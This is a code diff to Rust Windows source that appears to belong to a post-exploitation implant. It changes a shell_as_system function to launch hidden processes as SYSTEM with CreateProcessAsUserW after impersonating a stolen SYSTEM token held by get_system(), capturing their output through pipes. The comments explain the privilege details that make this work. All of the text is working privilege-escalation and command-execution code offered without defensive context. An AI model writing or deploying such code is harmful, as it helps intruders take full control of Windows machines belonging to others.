@@ -181,8 +181,11 @@ unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
     let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
 
     ImpersonateLoggedOnUser(token);
-    let ok = CreateProcessWithTokenW(
-        token, 0, std::ptr::null(), wcmd.as_mut_ptr(),
+    // Thread is now SYSTEM → SeAssignPrimaryTokenPrivilege held;
+    // CreateProcessAsUserW + bInheritHandles=1 properly inherits pipe handles.
+    let ok = CreateProcessAsUserW(
+        token, std::ptr::null(), wcmd.as_mut_ptr(),
+        std::ptr::null(), std::ptr::null(), 1,
         CREATE_NO_WINDOW, std::ptr::null(), std::ptr::null(),
         &si, &mut pi,
     );
@@ -190,7 +193,7 @@ unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
     CloseHandle(h_write);
     if ok == 0 {
         CloseHandle(h_read);
-        return format!("[error: CreateProcessWithTokenW {}]", GetLastError());
+        return format!("[error: CreateProcessAsUserW {}]", GetLastError());
     }
 
     let mut buf = Vec::<u8>::with_capacity(4096);
@@ -385,13 +388,13 @@ use windows_sys::Win32::Foundation::WAIT_OBJECT_0;
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Threading::{
     CreateEventW, WaitForSingleObject, GetCurrentThreadId,
-    CreateProcessWithTokenW, OpenThreadToken, GetCurrentThread,
+    CreateProcessAsUserW, OpenThreadToken, GetCurrentThread,
     PROCESS_INFORMATION, STARTUPINFOW, CREATE_NO_WINDOW, STARTF_USESTDHANDLES,
     TOKEN_IMPERSONATE,
 };
 
 // Primary SYSTEM token stored by get_system(); shell() uses it via
-// CreateProcessWithTokenW so commands run as SYSTEM on any thread.
+// CreateProcessAsUserW (after ImpersonateLoggedOnUser) so commands run as SYSTEM.
 #[cfg(target_os = "windows")]
 static mut G_SYSTEM_TOKEN: isize = 0;
 
